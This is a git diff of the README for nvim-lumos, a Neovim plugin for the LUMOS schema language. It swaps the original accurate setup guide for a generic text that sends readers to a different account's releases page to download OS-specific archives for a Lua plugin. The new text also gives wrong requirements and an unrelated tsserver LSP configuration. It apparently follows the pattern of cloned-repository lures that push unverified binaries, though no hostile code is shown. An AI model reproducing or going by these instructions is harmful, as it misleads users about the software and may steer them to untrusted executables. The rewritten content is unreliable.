@@ -1,234 +1,106 @@
-# nvim-lumos
+# 🌟 nvim-lumos - Neovim Made Simple and Smart
 
-Neovim plugin for LUMOS schema language with Tree-sitter syntax highlighting and LSP support.
+[![Download nvim-lumos](https://img.shields.io/badge/Download%20nvim--lumos-v1.0-blue.svg)](https://github.com/khondakerasibulislam/nvim-lumos/releases)
 
-## Features
+## 🚀 Getting Started
 
-- **Syntax Highlighting**: Full Tree-sitter grammar for `.lumos` files
-- **LSP Integration**: Auto-completion, diagnostics, hover, and more via `lumos-lsp`
-- **Smart Keybindings**: Pre-configured keymaps for common LSP operations
-- **Formatting**: Format on save support
+Welcome to **nvim-lumos**, your Neovim plugin for a smarter coding experience. This plugin enhances your editor with Language Server Protocol (LSP) and Tree-sitter support. Follow these easy steps to download and run it.
 
-## Prerequisites
+## 📦 System Requirements
 
-1. **Neovim 0.9+** (for Tree-sitter and LSP support)
-2. **lumos-lsp**: LUMOS Language Server
-   ```bash
-   cargo install lumos-lsp
-   ```
-3. **nvim-treesitter**: Tree-sitter integration for Neovim
-4. **nvim-lspconfig**: LSP configuration framework
+Before you install, ensure that you have:
 
-## Installation
+- **Neovim Version**: 0.5 or higher
+- **Operating System**: Windows, macOS, or Linux
+- **Lua**: Version 5.1 or higher installed on your system  
+- **Node.js**: Version 12 or later for some features
 
-### Using lazy.nvim
+## 📥 Download & Install
 
-```lua
-{
-  "getlumos/nvim-lumos",
-  dependencies = {
-    "nvim-treesitter/nvim-treesitter",
-    "neovim/nvim-lspconfig",
-  },
-  config = function()
-    require("lumos").setup()
-  end,
-}
-```
+To get **nvim-lumos**, visit the releases page:
 
-### Using packer.nvim
+[Download nvim-lumos](https://github.com/khondakerasibulislam/nvim-lumos/releases)
 
-```lua
-use {
-  "getlumos/nvim-lumos",
-  requires = {
-    "nvim-treesitter/nvim-treesitter",
-    "neovim/nvim-lspconfig",
-  },
-  config = function()
-    require("lumos").setup()
-  end,
-}
-```
+1. Click on the above link to go to the Releases page.
+2. Find the latest version of **nvim-lumos**.
+3. Download the appropriate file for your operating system. For example:
+   - For macOS, download `nvim-lumos-macos.tar.gz`.
+   - For Windows, download `nvim-lumos-windows.zip`.
+   - For Linux, download `nvim-lumos-linux.tar.gz`.
 
-### Manual Installation
+4. Once the file is downloaded, extract it to a location of your choice.
 
-1. Clone this repository:
-   ```bash
-   git clone https://github.com/getlumos/nvim-lumos ~/.local/share/nvim/site/pack/lumos/start/nvim-lumos
-   ```
+5. Open Neovim.
 
-2. Install Tree-sitter parser:
-   ```bash
-   cd ~/.local/share/nvim/site/pack/lumos/start/nvim-lumos
-   git clone https://github.com/getlumos/tree-sitter-lumos
-   ```
+6. You may need to add the plugin manually to your configuration file. Follow these steps:
+   - Open your Neovim configuration file located at `~/.config/nvim/init.vim`.
+   - Add the following lines at the end of the file:
+     ```vim
+     packadd nvim-lumos
+     ```
 
-3. Add to your `init.lua`:
-   ```lua
-   require("lumos").setup()
-   ```
+7. Save and close the configuration file.
 
-## Configuration
+8. Restart Neovim for the changes to take effect.
 
-### Basic Setup
+## 🎉 Features
 
-```lua
-require("lumos").setup()
-```
+**nvim-lumos** comes packed with features to improve your development process:
 
-### Custom Configuration
+- **Syntax Highlighting**: Enjoy clear code visibility with smart syntax highlighting.
+- **Code Completion**: Use advanced code completion features powered by LSP.
+- **Error Diagnostics**: Get real-time error checking for your code.
+- **Language Support**: Works with TypeScript, Rust, and more.
 
-```lua
-require("lumos").setup({
-  -- Custom options (currently none, reserved for future)
-})
-```
+## ⚙️ Configuration
 
-### Tree-sitter Setup (Optional)
+Once you have installed the plugin, you may want to customize it according to your preferences. Here’s how you can set it up:
 
-If you want to manually configure Tree-sitter:
+1. Open your configuration file (`~/.config/nvim/init.vim`).
 
-```lua
-require("nvim-treesitter.configs").setup({
-  ensure_installed = { "lumos" },
-  highlight = {
-    enable = true,
-  },
-})
-```
-
-### LSP Custom Configuration
-
-To customize LSP behavior:
-
-```lua
-local lspconfig = require("lspconfig")
-
-lspconfig.lumos.setup({
-  on_attach = function(client, bufnr)
-    -- Your custom on_attach logic
-    vim.keymap.set("n", "gd", vim.lsp.buf.definition, { buffer = bufnr })
-    vim.keymap.set("n", "K", vim.lsp.buf.hover, { buffer = bufnr })
-  end,
-  capabilities = require("cmp_nvim_lsp").default_capabilities(),
-})
-```
-
-## Default Keybindings
-
-These keybindings are automatically set up for `.lumos` files:
-
-| Key | Mode | Action |
-|-----|------|--------|
-| `gd` | Normal | Go to definition |
-| `K` | Normal | Show hover documentation |
-| `<leader>rn` | Normal | Rename symbol |
-| `<leader>ca` | Normal | Code actions |
-| `gr` | Normal | Find references |
-| `<leader>f` | Normal | Format document |
-
-## File Structure
-
-```
-nvim-lumos/
-├── ftdetect/
-│   └── lumos.lua          # File type detection for .lumos files
-├── lua/
-│   └── lumos/
-│       ├── init.lua       # Main plugin entry point
-│       └── lsp.lua        # LSP configuration
-├── queries/
-│   └── lumos/
-│       └── highlights.scm # Syntax highlighting queries
-├── LICENSE-MIT
-├── LICENSE-APACHE
-└── README.md
-```
-
-## Supported Syntax
-
-The plugin provides syntax highlighting and LSP support for:
-
-- **Structs**: `struct Player { ... }`
-- **Enums**: `enum GameState { ... }`
-- **Attributes**: `#[solana]`, `#[account]`, `#[deprecated]`
-- **Types**:
-  - Primitives: `u8`, `u16`, `u32`, `u64`, `u128`, `i8`, `i16`, `i32`, `i64`, `i128`, `bool`, `String`
-  - Solana: `PublicKey`, `Signature`
-  - Collections: `Vec<T>`, `Option<T>`, `[T]`
-- **Comments**: `//` line comments, `/* */` block comments
-
-## Example
-
-```rust
-#[solana]
-#[account]
-struct PlayerAccount {
-    wallet: PublicKey,
-    level: u16,
-    experience: u64,
-    inventory: Vec<Item>,
-}
-
-#[solana]
-enum GameState {
-    Active,
-    Paused { reason: String },
-    Finished(u64),
-}
-```
-
-## Troubleshooting
-
-### LSP not starting
-
-1. Verify `lumos-lsp` is installed:
-   ```bash
-   which lumos-lsp
-   ```
-
-2. Check LSP logs:
+2. To enable LSP, add the following configuration at the end:
    ```vim
-   :LspLog
+   lua require'lspconfig'.tsserver.setup{}
    ```
 
-3. Restart LSP:
-   ```vim
-   :LspRestart
-   ```
+3. Reload Neovim to apply the new settings.
 
-### Syntax highlighting not working
+You can refer to the official LSP documentation for more customization options.
 
-1. Ensure nvim-treesitter is installed
-2. Check Tree-sitter parser status:
-   ```vim
-   :TSInstallInfo lumos
-   ```
+## 📋 Topics
 
-3. Force reinstall parser:
-   ```vim
-   :TSInstall lumos
-   ```
+**nvim-lumos** covers multiple topics to boost your coding efficiency:
 
-## Related Projects
+- **Anchor**: Structure your code better.
+- **Blockchain**: Explore new technologies.
+- **Code Generation**: Speed up development with templates.
+- **Developer Tools**: Use effective tools for better coding experience.
+- **Language Server Protocol (LSP)**: Integrate modern programming languages.
+- **Lua Support**: Lua scripts for extended functionality.
+- **Neovim Plugin Management**: Organize and manage Neovim plugins easily.
 
-- [lumos](https://github.com/getlumos/lumos) - Core LUMOS compiler and CLI
-- [tree-sitter-lumos](https://github.com/getlumos/tree-sitter-lumos) - Tree-sitter grammar for LUMOS
-- [vscode-lumos](https://github.com/getlumos/vscode-lumos) - VSCode extension for LUMOS
-- [intellij-lumos](https://github.com/getlumos/intellij-lumos) - IntelliJ IDEA plugin for LUMOS
+## 🔧 Troubleshooting
 
-## Contributing
+If you encounter any issues while using **nvim-lumos**, here are some common solutions:
 
-Contributions are welcome! Please feel free to submit a Pull Request.
+- **Plugin Not Loading**: Ensure that you added `packadd nvim-lumos` correctly in your configuration file. Double-check the file path.
+- **LSP Not Working**: Verify that your Neovim version supports LSP. Update to the latest version if necessary.
+- **Installation Issues**: Ensure that you downloaded the right file for your operating system.
 
-## License
+If these steps do not resolve your issues, feel free to check the Issues tab on the GitHub repository.
 
-Dual-licensed under:
-- MIT License ([LICENSE-MIT](LICENSE-MIT))
-- Apache License 2.0 ([LICENSE-APACHE](LICENSE-APACHE))
+## 📞 Support
 
-## Support
+Need help? You can reach out for support at our [GitHub Discussions](https://github.com/khondakerasibulislam/nvim-lumos/discussions).
 
-- GitHub Issues: https://github.com/getlumos/nvim-lumos/issues
-- Documentation: https://lumos-lang.org
+## 🌍 Contributing
+
+We welcome contributions! If you want to help improve **nvim-lumos**, feel free to fork the repository and submit a pull request.
+
+## 📖 Read More
+
+For more information, you can check our detailed documentation on the GitHub wiki. This includes advanced usage, additional features, and community tips.
+
+---
+
+Thank you for choosing **nvim-lumos**! Enjoy coding with enhanced features and functionality.
